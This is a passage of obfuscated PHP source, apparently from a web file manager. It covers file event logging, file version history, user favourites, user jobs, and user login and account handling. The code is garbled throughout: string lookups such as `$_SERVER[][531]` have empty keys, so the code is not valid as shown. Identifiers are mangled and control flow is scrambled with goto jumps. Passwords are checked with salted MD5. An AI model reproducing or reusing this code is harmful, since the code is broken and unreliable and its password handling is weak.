$a㗐 = Model($C߰펰[1209]); $Fǖ = $a㗐->sourceInfo($b׍); goto E˚; Dﳒ: $this->addEvent($c׺, $C߰펰[1923], $EŚ); goto b; Dǅӧ: $this->addEvent($b׍, $C߰펰[533], $EŚ); $Fǖ = $a㗐->sourceInfo($b׍); $EŚ = array($C߰펰[395] => $Fǖ[$C߰펰[395]], $C߰펰[28] => $Fǖ[$C߰펰[28]]); goto Dﳒ; E˚: $cٙũ = $a㗐->sourceInfo($c׺); $E׺ = $a㗐->sourceInfo($Cȿ); $EŚ = array($C߰펰[1056] => $c׺, $C߰펰[1920] => $cٙũ[$C߰펰[28]], $C߰펰[1900] => !empty($cٙũ[$C߰펰[500]]) ? $cٙũ[$C߰펰[500]] : $C߰펰[33], $C߰펰[1057] => $Cȿ, $C߰펰[1921] => $E׺[$C߰펰[28]], $C߰펰[1922] => !empty($E׺[$C߰펰[500]]) ? $E׺[$C߰펰[500]] : $C߰펰[33]); goto Dǅӧ; b: } public function eventCopy($bՌ) { $this->eventCreate($bՌ, $_SERVER[][531]); } public function eventRename($B߻, $F², $DܙƆ) { $F =& $_SERVER[]; $eګ = array($F[1056] => $F², $F[1057] => $DܙƆ); return $this->addEvent($B߻, $F[1223], $eګ); } public function eventAddComment($Fۣ, $dχ) { return $this->addEvent($Fۣ, $_SERVER[][1924], $dχ); } public function eventAddDesc($eݸ, $a卌) { return $this->addEvent($eݸ, $_SERVER[][1925], $a卌); } public function listBySource($aޝ) { goto F킙; bқև߆: if ($C[$Eժ[403]] == $Eժ[87]) { $E = Model($Eժ[1209])->listSearchChildren($aޝ, 20000); $E[] = $aޝ . $Eժ[375]; $eĺ䬳 = array($Eժ[395] => array($Eժ[7], $E)); } $Aʮ = $this->where($eĺ䬳)->order($Eժ[1926])->selectPage(); if ($Aʮ[$Eժ[364]][$Eժ[365]] == 0) { $Aʮ[$Eժ[364]][$Eժ[365]] = 1; $Aʮ[$Eժ[367]] = array(array($Eժ[410] => $aޝ, $Eժ[1909] => $C[$Eժ[478]], $Eժ[1524] => $C[$Eժ[432]], $Eժ[415] => $Eժ[1927], $Eժ[416] => $C[$Eժ[194]], $Eժ[1526] => $Eժ[33])); } goto A䮲ݧ; F킙: $Eժ =& $_SERVER[]; $C = Model($Eժ[1209])->sourceInfo($aޝ); $eĺ䬳 = array($Eժ[410] => $aޝ); goto bқև߆; A䮲ݧ: return $this->eventListParse($Aʮ, $aޝ); goto D; D: } private function eventListParse($eƸ, $a) { goto c׽; C: $eƸ[$eͅփȖ[367]] = $Cݙ; return $eƸ; goto d; c͜: $C̺ = Model($eͅփȖ[795])->sourceListInfo($e, !0); foreach ($Cݙ as &$b֑) { if ($b֑[$eͅփȖ[29]] == $eͅփȖ[533] && isset($b֑[$eͅփȖ[431]][$eͅփȖ[1056]])) { $b֑[$eͅփȖ[431]][$eͅփȖ[1056]] = $C̺[$b֑[$eͅփȖ[431]][$eͅփȖ[1056]]]; $b֑[$eͅփȖ[431]][$eͅփȖ[1057]] = $C̺[$b֑[$eͅփȖ[431]][$eͅփȖ[1057]]]; } if ($b֑[$eͅփȖ[29]] == $eͅփȖ[1923] && isset($b֑[$eͅփȖ[431]][$eͅփȖ[395]])) { $b֑[$eͅփȖ[431]][$eͅփȖ[395]] = $C̺[$b֑[$eͅփȖ[431]][$eͅփȖ[395]]]; } $b֑[$eͅփȖ[85]] = $C̺[$b֑[$eͅփȖ[395]]]; $b֑[$eͅփȖ[1928]] = $C̺[$b֑[$eͅփȖ[1915]]]; if ($b֑[$eͅփȖ[29]] == $eͅփȖ[1668]) { $b֑[$eͅփȖ[1928]] = $b֑[$eͅփȖ[85]]; $b֑[$eͅփȖ[1915]] = $b֑[$eͅփȖ[1928]][$eͅփȖ[395]]; $b֑[$eͅփȖ[85]] = !1; $b֑[$eͅփȖ[395]] = $eͅփȖ[33]; } $b֑[$eͅփȖ[1859]] = $bЬְ[$b֑[$eͅփȖ[1533]]]; } unset($b֑); goto C; Bޮ: $e = array_unique($e); $CΜى = array_unique(array_to_keyvalue($Cݙ, $eͅփȖ[33], $eͅփȖ[1533])); $bЬְ = Model($eͅփȖ[519])->userListInfo($CΜى); goto c͜; c׽: $eͅփȖ =& $_SERVER[]; $Cݙ = $eƸ[$eͅփȖ[367]]; $e = array_to_keyvalue($Cݙ, $eͅփȖ[33], $eͅփȖ[395]); goto Aۋ; Aۋ: $bۇ = array_to_keyvalue($Cݙ, $eͅփȖ[33], $eͅփȖ[1915]); foreach ($Cݙ as $b֑) { $dܘ = $b֑[$eͅփȖ[431]]; if ($b֑[$eͅփȖ[29]] == $eͅփȖ[533] && isset($dܘ[$eͅփȖ[1056]])) { $e[] = $dܘ[$eͅփȖ[1056]] . $eͅփȖ[33]; $e[] = $dܘ[$eͅփȖ[1057]] . $eͅփȖ[33]; } if ($b֑[$eͅփȖ[29]] == $eͅփȖ[1923] && isset($dܘ[$eͅփȖ[395]])) { $e[] = $dܘ[$eͅփȖ[395]] . $eͅփȖ[33]; } } $e = array_merge($e, $bۇ, array($a . $eͅփȖ[33])); goto Bޮ; d: } public function removeBySource($F棰) { $Cǖ = array($_SERVER[][410] => $F棰); $this->where($Cǖ)->remove(); } } class SourceHistoryModel extends ModelBase { protected $tableName = "\151\157\137\163\157\x75\162\143\x65\137\x68\151\163\x74\x6f\x72\x79"; public function historyCount($F) { goto ḙ㹪; Fϋҍ: $b = array($a[395], $a[1734] => $a[480]); $Bӄ = array($a[395] => array($a[7], $F)); $Fέ = $this->field($b)->where($Bӄ)->group($a[395])->select(); goto f; ḙ㹪: $a =& $_SERVER[]; if (!$F) { return array(); } if (is_string($F) || is_int($F)) { $F = array($F); } goto Fϋҍ; f: return array_to_keyvalue($Fέ, $a[395], $a[480]); goto Bᾐ; Bᾐ: } public function addHistory($D, $E = '') { $BÅӅ =& $_SERVER[]; $A臍 = array($BÅӅ[410] => $D[$BÅӅ[395]], $BÅӅ[1524] => isset($D[$BÅӅ[434]]) ? $D[$BÅӅ[434]] : $D[$BÅӅ[432]], $BÅӅ[448] => $D[$BÅӅ[447]], $BÅӅ[561] => $D[$BÅӅ[78]], $BÅӅ[1929] => $E); $b߽ = $GLOBALS[$BÅӅ[6]][$BÅӅ[88]][$BÅӅ[1107]]; if ($b߽ > 1) { $this->historyAutoClear($A臍[$BÅӅ[395]]); $this->add($A臍); } Hook::trigger($BÅӅ[1930], $A臍); Model($BÅӅ[1931])->eventFileEdit($D[$BÅӅ[395]]); } private function historyAutoClear($cϋ) { goto BŎ; B峛̧: $cʤ = array($f[410] => $cϋ); $dλ = $this->field($f[1932])->where($cʤ)->order($f[1926])->select(); if (!$dλ || $C餒 >= count($dλ)) { return; } goto C˼; aׇ: $C餒 = $E͝ == $f[1130] ? 5 : $b; if ($b <= 1) { $C餒 = 1; } if ($C餒 >= 500) { return; } goto B峛̧; C˼: $a = array_to_keyvalue($dλ, $f[33], $f[393]); $a = array_slice($a, $C餒); $eް皏 = array_to_keyvalue($dλ, $f[33], $f[447]); goto Bݺٺ; Bݺٺ: $eް皏 = array_slice($eް皏, $C餒); if (!$a || !$eް皏) { return; } $cʤ = array($f[412] => array($f[7], $a)); goto DŅ; BŎ: $f =& $_SERVER[]; $E͝ = Model($f[735])->get($f[1129]); $b = $GLOBALS[$f[6]][$f[88]][$f[1107]]; goto aׇ; DŅ: $this->where($cʤ)->delete(); Model($f[450])->remove($eް皏); goto d; d: } public function listData($E垪) { goto fȅ; D޽ߕ: $BͰ = 5; if ($d珉ܢ == $eډ[1130]) { $BɅ[$eډ[367]] = array_slice($BɅ[$eډ[367]], 0, $BͰ); $BɅ[$eډ[364]] = array($eډ[1934] => 1, $eډ[1935] => 20, $eډ[1936] => 1, $eډ[1937] => count($BɅ[$eډ[367]])); } return $BɅ; goto f׬; c޾: $BɅ = $this->field($dǅ)->where($F)->order($eډ[1926])->selectPage(); $this->_listAppendUser($BɅ[$eډ[367]]); $d珉ܢ = Model($eډ[735])->get($eډ[1129]); goto D޽ߕ; fȅ: $eډ =& $_SERVER[]; $F = array($eډ[410] => $E垪); $dǅ = $eډ[1933]; goto c޾; f׬: } protected function _listAppendUser(&$C) { $f =& $_SERVER[]; $AϤԽ = array_to_keyvalue($C, $f[33], $f[1533]); $Eӵ = Model($f[519])->userListInfo($AϤԽ); foreach ($C as &$bҩ) { $Bǫϥ = $bҩ[$f[1533]]; $bҩ[$f[432]] = $Eӵ[$Bǫϥ] ? $Eӵ[$Bǫϥ] : !1; } unset($bҩ); } public function fileInfo($F) { $FԊԌ =& $_SERVER[]; $aމ = $this->tablePrefix; $F = "{$aމ}\x69\157\x5f\146\x69\x6c\145\x20\x66\151\154\x65\163\x20\x6f\x6e\x20\146\x69\154\x65\x73\x2e\x66\x69\154\x65\x49\104\x20\75\x20\x68\x69\x73\164\157\x72\x79\x2e\146\x69\x6c\145\x49\x44"; return $this->alias($FԊԌ[1938])->where(array($FԊԌ[412] => $F))->join($F, $FԊԌ[1939])->find(); } public function removeItem($aݝ) { $E =& $_SERVER[]; $fՂ׽ = array($E[412] => $aݝ); $Eό = $this->where($fՂ׽)->find(); if ($Eό) { $F = $this->where($fՂ׽)->delete(); Model($E[450])->remove($Eό[$E[447]]); return $F; } return !1; } public function removeBySource($e) { goto E٤È; Fօ: return !0; goto Fܬ; E٤È: $DȆ =& $_SERVER[]; if (!$e) { return !1; } if (!is_array($e)) { $e = array($e); } goto a҅ߜ; a҅ߜ: $D۪ = array($DȆ[410] => array($DȆ[7], $e)); $D = $this->field($DȆ[448])->where($D۪)->select(); if ($D) { $this->where($D۪)->delete(); $fя׆ = array_to_keyvalue($D, $DȆ[33], $DȆ[447]); Model($DȆ[450])->remove($fя׆); } goto Fօ; Fܬ: } public function setDetail($aˈ֙, $aЌߚ) { $E㋜ =& $_SERVER[]; return $this->where(array($E㋜[412] => $aˈ֙))->save(array($E㋜[1929] => $aЌߚ)); } public function rollbackToItem($d, $aƻ) { goto EԸ; F̖Ē: $D = $this->find($aƻ); $Eñ = array($f͉ړ[447] => $D[$f͉ړ[447]], $f͉ړ[78] => $D[$f͉ړ[78]], $f͉ړ[84] => time(), $f͉ړ[434] => USER_ID); Model($f͉ړ[795])->where(array($f͉ړ[395] => $d))->save($Eñ); goto Aԩ; EԸ: $f͉ړ =& $_SERVER[]; $Eȉ = Model($f͉ړ[795])->sourceInfo($d); $this->addHistory($Eȉ, LNG($f͉ړ[1940])); goto F̖Ē; Aԩ: return $this->where(array($f͉ړ[412] => $aƻ))->delete(); goto aʤ; aʤ: } public function clearSame($ǎǌ) { goto D; D: $a =& $_SERVER[]; $Aџݬ = $this->listData($ǎǌ); $C̆ = array_to_keyvalue_group($Aџݬ, $a[447]); goto aϣ; aϣ: $FɎ䯶 = array(); $Dϭ = array(); foreach ($C̆ as $d裆) { if (!$d裆 || count($d裆) <= 1) { continue; } foreach ($d裆 as $Dۄ) { $FɎ䯶[] = $Dۄ[$a[447]]; $Dϭ[] = $Dۄ[$a[393]]; } } goto aĦ; aĦ: if (!$Dϭ) { return; } $this->where(array($a[393] => array($a[7], $Dϭ)))->delete(); Model($a[450])->remove($FɎ䯶); goto dؗ; dؗ: } public function userSpace() { $bڔѐ =& $_SERVER[]; $E = $this->tablePrefix; $d횶 = array($bڔѐ[1524] => USER_ID); $aŐ = "{$E}\151\157\x5f\146\x69\154\x65\x20\x66\151\154\x65\163\40\x6f\x6e\40\x66\x69\x6c\145\163\x2e\x66\x69\x6c\x65\111\x44\x20\x3d\x20\150\x69\163\164\157\x72\x79\x2e\x66\151\154\145\111\104"; return $this->alias($bڔѐ[1938])->where($d횶)->join($aŐ, $bڔѐ[1939])->sum($bڔѐ[78]); } } goto Bñ; dԿ: define($_SERVER[][237], 2); define($_SERVER[][238], 3); define($_SERVER[][239], 1); goto eیζ; Cڜ: $bū = $_SERVER[][587]; $_SERVER[뱊] = explode($_SERVER[][588], gzinflate(substr($_SERVER[][589], 10, -8))); $eۋ = $_SERVER[][590]; goto D; A瘔: class UserFavModel extends ModelBase { protected $tableName = "\165\x73\x65\162\x5f\146\141\166"; protected function cacheFunctionAlias($F׿߆) { $dǻݝ =& $_SERVER[]; return array($dǻݝ[1804] => array(USER_ID, $dǻݝ[2122])); } protected function listData() { $A =& $_SERVER[]; $A渣 = array($A[1524] => USER_ID, $A[463] => 0); $c攫庖 = $A[2123]; $a󐘥 = $this->field($c攫庖)->where($A渣)->order($A[2124])->select(); return $a󐘥 ? $a󐘥 : array(); } protected function resetCache() { } protected function listView() { goto dٿ; dٿ: $CϺ =& $_SERVER[]; $Aɋ = $this->listData(); $b܌ = array_filter_by_field($Aɋ, $CϺ[29], $CϺ[409]); goto Dٹ; a챻: $D﯂ = array_to_keyvalue($D﯂, $CϺ[395]); foreach ($Aɋ as $aӋ => $FΊ) { $f = $D﯂[$FΊ[$CϺ[76]]]; $f = $f ? $f : array(); $Aɋ[$aӋ] = array_merge($f, $FΊ); } return $Aɋ; goto fط; bљ: $A = array($CϺ[410] => array($CϺ[411], $b)); $D﯂ = Model($CϺ[795])->listSource($A, $AȏЅ); $D﯂ = array_merge($D﯂[$CϺ[74]], $D﯂[$CϺ[75]]); goto a챻; Dٹ: $b = array_to_keyvalue($b܌, $CϺ[33], $CϺ[76]); if (!$b) { return $Aɋ; } $AȏЅ = 2000; goto bљ; fط: } protected function addFav($f, $e뻒Ј = '', $cӫ = "\163\x6f\x75\162\x63\145") { goto b߻; b: $aڂ = array($aؗ[1524] => USER_ID, $aؗ[463] => 0); $D = $this->where($aڂ)->max($aؗ[1725]); if (!$D) { $D = 0; } goto a¢ػ; a¢ػ: if (!$e뻒Ј && $cӫ == $aؗ[409]) { $eǜ默 = Model($aؗ[1209])->where(array($aؗ[410] => $f))->find(); if (!$eǜ默) { return !1; } $e뻒Ј = $eǜ默[$aؗ[28]]; } $e뻒Ј = $this->getAutoName($e뻒Ј); $C܇Ï = array($aؗ[1524] => USER_ID, $aؗ[463] => 0, $aؗ[413] => $e뻒Ј, $aؗ[414] => $f, $aؗ[415] => $cӫ, $aؗ[1706] => $D + 1); goto bȃ; bȃ: return $this->add($C܇Ï); goto E驵; b߻: $aؗ =& $_SERVER[]; $aڂ = array($aؗ[1524] => USER_ID, $aؗ[463] => 0, $aؗ[415] => $cӫ, $aؗ[414] => $f); if ($this->where($aڂ)->find()) { return !1; } goto b; E驵: } protected function remove($fƋ) { $fΆ =& $_SERVER[]; $CҸ = array($fΆ[1524] => USER_ID, $fΆ[412] => $fƋ); return $this->where($CҸ)->delete(); } protected function removeByName($b٤ͭ) { $fё΢ =& $_SERVER[]; $C憓 = array($fё΢[1524] => USER_ID, $fё΢[413] => $b٤ͭ, $fё΢[463] => 0); return $this->where($C憓)->delete(); } protected function rename($Aګ, $Eƕ) { $eȦ =& $_SERVER[]; if ($Aګ == $Eƕ) { return !1; } $F = $this->getAutoName($Eƕ); if ($Eƕ != $F) { return !1; } $b = array($eȦ[1524] => USER_ID, $eȦ[463] => 0, $eȦ[28] => $Aګ); return $this->where($b)->save(array($eȦ[28] => $Eƕ)); } protected function resetSort($DՎٲ) { $c =& $_SERVER[]; $DՎٲ = is_array($DՎٲ) ? $DՎٲ : array(); $dΨ֒ = array($c[1524] => USER_ID); for ($E = 0; $E < count($DՎٲ); $E++) { $dΨ֒[$c[412]] = $DՎٲ[$E]; $this->where($dΨ֒)->save(array($c[1706] => $E + 1)); } return !0; } protected function moveTop($cꙊЂ) { goto A׈; F娆: $cã = $bҬ; $bҬ = array_remove_value($bҬ, $c낈ƌ[$cг[393]]); array_unshift($bҬ, $c낈ƌ[$cг[393]]); goto Dվ; A٤: if (!$c낈ƌ) { return; } $bҬ = $this->field($cг[393])->where($aǧ)->order($cг[2124])->select(); $bҬ = array_to_keyvalue($bҬ, $cг[33], $cг[393]); goto F娆; A׈: $cг =& $_SERVER[]; $aǧ = array($cг[1524] => USER_ID, $cг[463] => 0); $c낈ƌ = $this->where($aǧ)->where(array($cг[28] => $cꙊЂ))->find(); goto A٤; Dվ: return $this->resetSort($bҬ); goto F鴞; F鴞: } protected function moveBottom($a׭Ȅ) { $Bӂ =& $_SERVER[]; $f˪Ԡ = array($Bӂ[1524] => USER_ID, $Bӂ[463] => 0); $EҚԤ = $this->where($f˪Ԡ)->max($Bӂ[1725]); $D̦ = array($Bӂ[1725] => $EҚԤ + 1); return $this->where($f˪Ԡ)->where(array($Bӂ[28] => $a׭Ȅ))->save($D̦); } private function getAutoName($b訬) { goto C⎾; Dؐ: $Cʹ = array_to_keyvalue($Cʹ, $Dϰ[33], $Dϰ[28]); if (!$Cʹ || !in_array($b訬, $Cʹ)) { return $b訬; } for ($f鹓 = 0; $f鹓 < count($Cʹ); $f鹓++) { if (!in_array($b訬 . "\50{$f鹓}\x29", $Cʹ)) { return $b訬 . "\50{$f鹓}\51"; } } goto c̹; c̹: return $b訬 . "\50{$f鹓}\51"; goto DĈ; C⎾: $Dϰ =& $_SERVER[]; $c暨 = array($Dϰ[1524] => USER_ID, $Dϰ[463] => 0); $Cʹ = $this->field($Dϰ[28])->where($c暨)->select(); goto Dؐ; DĈ: } } class UserJobModel extends ModelBaseLight { public $optionType = "\x53\x79\163\164\145\x6d\x2e\152\157\142\114\x69\163\x74"; public $field = array("\x6e\141\x6d\145", "\144\145\x73\143", "\163\157\162\164"); const JOB_KEY = "\x73\145\154\146\x4a\157\x62\x4c\151\x73\x74"; public function listData($dȖ = false, $EÊې = "\x73\x6f\162\x74", $aȭ = false) { return parent::listData($dȖ, $EÊې, $aȭ); } public function remove($eߐ) { return parent::remove($eߐ); } public function add($cϜ) { $D՛鷰 =& $_SERVER[]; if ($this->findByName($cϜ[$D՛鷰[28]])) { return !1; } $cϜ[$D՛鷰[1725]] = $this->getSort(); return parent::insert($cϜ); } private function getSort() { $fܛ =& $_SERVER[]; $aɬК = parent::listData(); $F񛇤 = array_to_keyvalue($aɬК, $fܛ[33], $fܛ[1725]); return empty($F񛇤) ? 0 : max($F񛇤) + 1; } public function update($BΟ, $bяذ) { $cӊբ =& $_SERVER[]; $A˫ = parent::listData($BΟ); $c = $this->findByName($bяذ[$cӊբ[28]]); if (!$A˫ || $c && $c[$cӊբ[393]] != $A˫[$cӊբ[393]]) { return !1; } return parent::update($BΟ, $bяذ); } public function setUserJob($cӜ, $d媂) { goto Eȷ˳; Eȷ˳: $b =& $_SERVER[]; if (!is_array($d媂)) { $d媂 = array($d媂); } $FإȞ = parent::listData(); goto c; c: $bڸ = array_to_keyvalue($FإȞ, $b[28]); $Cт = $b[375]; foreach ($d媂 as $E蒻) { if ($bڸ[$E蒻]) { $Cт .= $bڸ[$E蒻][$b[393]] . $b[47]; } else { $e = $this->add($E蒻); $Cт .= $e . $b[47]; } } goto e; e: $Cт = rtrim($Cт, $b[47]); Model($b[519])->metaSet($cӜ, self::JOB_KEY, $Cт); goto D畼; D畼: } public function getUserJob($D) { $dȮ = Model($_SERVER[][519])->metaGet($D); return $this->getUserJobInfo($dȮ[self::JOB_KEY]); } public function getUserJobInfo($EՐ) { goto Cȉؠ; B܆: $e = array_remove_key($e, $CԳ[194]); $FӍĲ = array(); foreach ($c as $cޮ) { if (isset($e[$cޮ])) { $FӍĲ[] = $e[$cޮ]; } } goto F; Cȉؠ: $CԳ =& $_SERVER[]; $c = explode($CԳ[47], $EՐ); $e = parent::listData(); goto B܆; F: return $FӍĲ; goto a; a: } } class UserModel extends ModelBase { protected $tableName = "\x75\163\x65\x72"; protected $tableMeta = array("\164\x61\142\154\x65\x4e\141\155\x65" => "\165\163\x65\162\137\155\145\164\141", "\155\x65\x74\141\x46\151\145\154\144" => "\x75\x73\x65\x72\x49\104"); protected $simpleField = "\x75\163\145\162\x49\x44\54\x6e\x69\x63\153\116\x61\155\x65\x2c\x6e\141\155\145\54\141\166\141\x74\141\x72\x2c\x73\145\170\54\x73\x74\141\164\165\x73"; const ERROR_USER_NOT_EXISTS = -1; const ERROR_USER_PASSWORD_ERROR = -2; const ERROR_USER_EXIST_NAME = -3; const ERROR_USER_EXIST_PHONE = -4; const ERROR_USER_EXIST_EMAIL = -5; const ERROR_USER_LOGIN_LOCK = -6; const ERROR_IP_NOT_ALLOW = -7; const ERROR_USER_EXIST_NICKNAME = -8; protected function cacheFunctionAlias($c) { $Aɧ =& $_SERVER[]; $D° = $Aɧ[2125]; return array($Aɧ[1772] => array($c[0], $D°), $Aɧ[1774] => array($c[0], $D°), $Aɧ[2126] => array($c[0], $D°)); } protected function getInfo($dݛނÓ, $CΝˊ = false) { $Aӕ = $this->getInfoSimple($dݛނÓ); if (!is_array($Aӕ)) { return array(); } if ($CΝˊ) { return $this->_getInfoApply($Aӕ); } return $this->cacheFunctionGet($_SERVER[][1781], $dݛނÓ); } protected function getInfoFull($dڑ, $D󬻴 = false) { $c = $this->getInfoSimple($dڑ); if (!is_array($c)) { return array(); } if ($D󬻴) { return $this->_getInfoApply($c, !0); return $this->_getInfoApply($c, !0); } return $this->cacheFunctionGet($_SERVER[][2127], $dڑ); } private function _getInfoApply($CŐ˳, $d = false) { goto b; f튍މ: $CŐ˳[$dƿ[85]][$dƿ[1961]] = isset($B޵[$dƿ[1962]]) ? $B޵[$dƿ[1962]] : null; if ($d) { $CŐ˳[$dƿ[445]] = $this->metaGet($CŐ˳[$dƿ[1533]]); } return $CŐ˳; goto Eéנ; b: $dƿ =& $_SERVER[]; if (!$CŐ˳) { return $CŐ˳; } $dºÔ = md5($dƿ[2128] . $CŐ˳[$dƿ[851]] . $dƿ[2129] . $CŐ˳[$dƿ[28]]); goto cޖȝ; cޖȝ: $CŐ˳ = $this->_listDataApplyItem($CŐ˳); $B޵ = Model($dƿ[1209])->metaGet($CŐ˳[$dƿ[85]][$dƿ[395]]); $CŐ˳[$dƿ[2130]] = $dºÔ; goto f튍މ; Eéנ: } protected function getInfoSimple($D, $dԳ = false) { $f =& $_SERVER[]; if (!$D) { return array(); } if ($dԳ) { $Fտᢓ = $this->where(array($f[1533] => intval($D)))->find(); if (!is_array($Fտᢓ)) { return array(); } $Fտᢓ[$f[2131]] = Action($f[2132])->parseUrl($Fտᢓ[$f[2131]]); return $Fտᢓ; } return $this->cacheFunctionGet($f[1775], $D); } protected function getInfoSimpleOuter($aԆ) { goto d; b: $c⥬͌ = array_field_key($dČ, explode($dٜ[47], $this->simpleField)); if (!$c⥬͌) { return array($dٜ[1533] => $dٜ[1088], $dٜ[28] => $dٜ[160] . LNG($dٜ[2135]) . $dٜ[517], $dٜ[2131] => STATIC_PATH . $dٜ[2136]); } $c⥬͌[$dٜ[2131]] = Action($dٜ[2132])->parseUrl($c⥬͌[$dٜ[2131]]); goto cЎ׹; d: $dٜ =& $_SERVER[]; if (!$aԆ || $aԆ == 0) { return array($dٜ[1533] => $dٜ[191], $dٜ[28] => $dٜ[160] . LNG($dٜ[2133]) . $dٜ[517], $dٜ[2131] => STATIC_PATH . $dٜ[2134]); } $dČ = $this->cacheFunctionGet($dٜ[1775], $aԆ); goto b; cЎ׹: return $c⥬͌; goto cߨ; cߨ: } protected function groupUser($A䷉) { } public static function errorLang($fȑ) { $d墆 =& $_SERVER[]; $eò֗ = array(self::ERROR_USER_NOT_EXISTS => $d墆[2137], self::ERROR_USER_PASSWORD_ERROR => $d墆[2138], self::ERROR_USER_EXIST_NAME => $d墆[2139], self::ERROR_USER_EXIST_PHONE => $d墆[2140], self::ERROR_USER_EXIST_EMAIL => $d墆[2141], self::ERROR_USER_LOGIN_LOCK => $d墆[2142], self::ERROR_IP_NOT_ALLOW => $d墆[2143], self::ERROR_USER_EXIST_NICKNAME => $d墆[2144]); return LNG($eò֗[$fȑ]); } public function getInfoByMeta($D, $a֋) { $E =& $_SERVER[]; $aӱ = Model($E[2145])->where(array($E[93] => $D, $E[372] => $a֋))->find(); if ($aӱ) { return $this->getInfo($aӱ[$E[1533]]); } return !1; } public function userLoginCheck($Cܑ, $E߉) { $AɃ =& $_SERVER[]; $D = $this->userLoginFind($Cܑ); if (!$D) { return UserModel::ERROR_USER_NOT_EXISTS; } if (!$this->userPasswordCheck($D[$AɃ[1533]], $E߉)) { return UserModel::ERROR_USER_PASSWORD_ERROR; } return $this->getInfo($D[$AɃ[1533]]); } public function userLoginFind($E) { $FԄ =& $_SERVER[]; $AĽѬ = array($FԄ[28] => $E, $FԄ[1965] => $E, $FԄ[303] => $E, $FԄ[2146] => $E, $FԄ[959] => $FԄ[961]); if ($this->nickNameRpt()) { unset($AĽѬ[$FԄ[1965]]); } return $this->where($AĽѬ)->find(); } public function clearCache($E祟኉) { $aџ =& $_SERVER[]; $this->cacheFunctionClear($aџ[1781], $E祟኉); $this->cacheFunctionClear($aџ[1775], $E祟኉); $this->cacheFunctionClear($aџ[2127], $E祟኉); } public function userPasswordCheck($Dܔ, $A̚) { $aܢĄ =& $_SERVER[]; $Eׄ߃ = $this->where(array($aܢĄ[1533] => intval($Dܔ)))->find(); $FϜ = $this->metaGet($Dܔ); $c = isset($FϜ[$aܢĄ[2147]]) ? $FϜ[$aܢĄ[2147]] : $aܢĄ[33]; if (md5($c . trim($A̚)) !== $Eׄ߃[$aܢĄ[851]]) { return !1; } return !0; } public function userAdd($cÌ) { goto B󿃻; F圪: $A = array($e߹[2155] => $eՕ[$e߹[851]], $e߹[2151] => $eՕ[$e߹[1965]]); $this->userEdit($dՌ, $A); Model($e߹[1209])->userRootAdd($dՌ); goto cþ; cþ: return $dՌ; goto F۱; B󿃻: $e߹ =& $_SERVER[]; $eՕ = array($e߹[413] => $cÌ[$e߹[28]], $e߹[2148] => $cÌ[$e߹[1416]], $e߹[2149] => isset($cÌ[$e߹[303]]) ? $cÌ[$e߹[303]] : $e߹[33], $e߹[2150] => isset($cÌ[$e߹[2146]]) ? $cÌ[$e߹[2146]] : $e߹[33], $e߹[2151] => isset($cÌ[$e߹[1965]]) ? $cÌ[$e߹[1965]] : $cÌ[$e߹[28]], $e߹[2152] => isset($cÌ[$e߹[2131]]) ? $cÌ[$e߹[2131]] : $e߹[33], $e߹[2153] => isset($cÌ[$e߹[2154]]) ? $cÌ[$e߹[2154]] : 1, $e߹[2155] => $cÌ[$e߹[851]], $e߹[1776] => isset($cÌ[$e߹[1686]]) ? $cÌ[$e߹[1686]] : 1024 * 1024 * 20, $e߹[1777] => 0, $e߹[2156] => 0, $e߹[1820] => isset($cÌ[$e߹[715]]) ? $cÌ[$e߹[715]] : 1); if (!empty($cÌ[$e߹[1533]])) { $eՕ[$e߹[1533]] = $cÌ[$e߹[1533]]; } goto c몒; c몒: $E䄠 = $this->_checkExist($cÌ); if ($E䄠 !== !0) { return $E䄠; } $dՌ = $this->add($eՕ); goto F圪; F۱: } protected function userEditTest($BǮ, $Eؑ) { return $this->call($_SERVER[][2157], $BǮ, $Eؑ); } protected function userEdit($aч, $dϽ) { goto e˂; cȽ: return !0; goto D; bڌ: $this->where(array($c[1524] => $aч))->save($dϽ); if (isset($dϽ[$c[1965]])) { $this->setNamePinyin($aч, $dϽ[$c[1965]]); } $this->clearCache($aч); goto cȽ; cᲸ: $C = $this->_checkExist($dϽ, $aч); if ($C !== !0) { return $C; } if (isset($dϽ[$c[851]]) && trim($dϽ[$c[851]]) != $c[33]) { $C̑ = $this->metaGet($aч); if (empty($C̑[$c[2147]])) { $C̑[$c[2147]] = rand_string(10); Model($c[494])->metaSet($aч, $c[2147], $C̑[$c[2147]]); } $dϽ[$c[851]] = md5($C̑[$c[2147]] . trim($dϽ[$c[851]])); } else { unset($dϽ[$c[851]]); } goto bڌ; e˂: $c =& $_SERVER[]; $dϭ = $this->getInfoSimple($aч); if (!$dϭ) { return !1; } goto cᲸ; D: } public function setNamePinyin($Fί, $D = false) { $c =& $_SERVER[]; if (!$D) { $b뿭 = $this->getInfoSimple($Fί); $D = $b뿭[$c[1965]] ? $b뿭[$c[1965]] : $b뿭[$c[28]]; } $bޗ = Model($c[519]); if (!Input::check($D, $c[569])) { return $bޗ->metaSet($Fί, array($c[444] => $c[33], $c[443] => $c[33])); } return $bޗ->metaSet($Fί, array($c[444] => str_replace($c[50], $c[33], Pinyin::encode($D)), $c[443] => Pinyin::encode($D, $c[570]))); } private function nickNameRpt() { $D앨̰ =& $_SERVER[]; $CϦ = Model($D앨̰[735])->get($D앨̰[2158]); $a = $GLOBALS[$D앨̰[6]][$D앨̰[378]][$D앨̰[2158]]; $Eӝ× = !is_null($CϦ) ? $CϦ : $a; return !!$Eӝ×; } private function _checkExist($F, $C嵜 = false) { $fӌ℘ =& $_SERVER[]; $Eݸ = array($fӌ℘[28] => UserModel::ERROR_USER_EXIST_NAME, $fӌ℘[1965] => UserModel::ERROR_USER_EXIST_NICKNAME, $fӌ℘[303] => UserModel::ERROR_USER_EXIST_EMAIL, $fӌ℘[2146] => UserModel::ERROR_USER_EXIST_PHONE); if ($this->nickNameRpt()) { unset($Eݸ[$fӌ℘[1965]]); } $C = $C嵜 ? array($fӌ℘[1533] => array($fӌ℘[2159], $C嵜)) : array(); foreach ($Eݸ as $B => $e샜) { $F˪ = array(); foreach ($Eݸ as $B̔ => $f) { if (isset($F[$B̔]) && $F[$B̔]) { $F˪[] = $F[$B̔]; } } if (!$F˪) { continue; } $d֋͈ = array_merge(array($B => array($fӌ℘[7], $F˪)), $C); $A = $this->where($d֋͈)->find(); if ($A) { return $e샜; } } return !0; } public function userListInfo($B) { $Bŋև =& $_SERVER[]; $C = array(); $B = is_array($B) ? array_unique($B) : array(); if (!$B) { return $C; } if (count($B) < 20) { foreach ($B as $Bэ) { $C[$Bэ . $Bŋև[33]] = $this->getInfoSimpleOuter($Bэ); } } else { $F = array($Bŋև[1524] => array($Bŋև[411], $B)); if (count($B) == 1) { $F = array($Bŋև[1524] => $B[0]); } $Cۊ = 